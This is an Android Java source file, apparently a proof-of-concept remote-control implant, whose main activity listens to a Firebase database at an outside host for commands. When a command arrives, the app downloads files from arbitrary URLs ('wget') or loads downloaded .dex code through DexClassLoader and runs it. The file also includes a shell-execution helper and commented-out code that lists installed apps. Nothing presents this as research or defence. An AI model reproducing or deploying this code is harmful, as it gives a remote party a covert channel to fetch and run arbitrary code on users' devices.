package project.richthofen911.matata;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.firebase.client.ChildEventListener;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;

import org.w3c.dom.Text;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import dalvik.system.DexClassLoader;


public class MainActivity extends Activity {

    TextView tv_display;
    private static Context thisContext;
    public static Firebase refCommand;
    public static Firebase refResult;
    public static Firebase refDisplay;
    ChildEventListener eventListenerCommand;
    public static HashMap<String, String> commandSet = new HashMap<>();
    private Map<String, Object> newPostCommand;
    private String cmdRaw = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Firebase.setAndroidContext(this);
        refCommand = new Firebase("https://hakuna-matata.firebaseio.com/command");
        refResult = new Firebase("https://hakuna-matata.firebaseio.com/result");
        refDisplay = new Firebase("https://hakuna-matata.firebaseio.com/display");
        thisContext = getApplicationContext();
        Log.e("command listener", "");
        startEventListenerCommand();
        //commandSet.put("wget", "wget");

        //commandExecutor("wget");
        Button btnFire = (Button) findViewById(R.id.btn_fire);
        tv_display = (TextView) findViewById(R.id.tv_display);

        btnFire.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

            }
        });

    }

    private void commandExecutor(String cmd){
        String[] cmdSplited = cmd.split(" ");
        if(cmdSplited[0].equals("wget")){
            wget(cmdSplited[1], cmdSplited[2], cmdSplited[3]);
        }else{
            loadDex(commandSet.get(cmd));
        }

        refCommand.removeValue();
    }

    private void wget(String url, String fileName, String fileSize) {
        Wget.asynDownloadFile(url, fileName, fileSize);
    }

    public void addCommand(String key){
        commandSet.put(key, "className");
    }

    private void loadDex(String className){
        File pathDexFile = new File(getFilesDir() + File.separator + className + ".dex");
        DexClassLoader dexClassLoader = new DexClassLoader(pathDexFile.getAbsolutePath(), getCacheDir().toString(),
                null, getClassLoader());
        try {
            Class classFunctionProvider = dexClassLoader.loadClass("project.richthofen911.matata." + className);
            DexLoaderTemplate newDex = (DexLoaderTemplate) classFunctionProvider.newInstance();
            newDex.functionality(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String exec(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
                //textView.append(output);
            }
            reader.close();
            process.waitFor();
            return output.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void startEventListenerCommand(){
        eventListenerCommand = refCommand.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                //newPostCommand = (Map<String, Object>) dataSnapshot.getValue();
                //cmdRaw = (String) newPostCommand.get("cmd");
                cmdRaw = (String)dataSnapshot.getValue();
                Log.e("cmd received", cmdRaw);
                commandExecutor(cmdRaw);
            }

            @Override
            public void onChildChanged(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onChildRemoved(DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onCancelled(FirebaseError firebaseError) {

            }
        });
    }

    /*
        //get package info
        PackageManager packagemanager = this.getPackageManager();
        List<PackageInfo> packageInfoList = packagemanager.getInstalledPackages(0);
        for(int i = 0; i < packageInfoList.size(); i++){
            PackageInfo packageInfo = (PackageInfo) packageInfoList.get(i);
            //check if the app is a preinstalled with factory stock
            if((packageInfo.applicationInfo.flags & packageInfo.applicationInfo.FLAG_SYSTEM) <= 0){
                tv_display.append(packageInfo.packageName + "\n");
            }
        }
*/
    public static Context getThisContext(){
        return thisContext;
    }

}
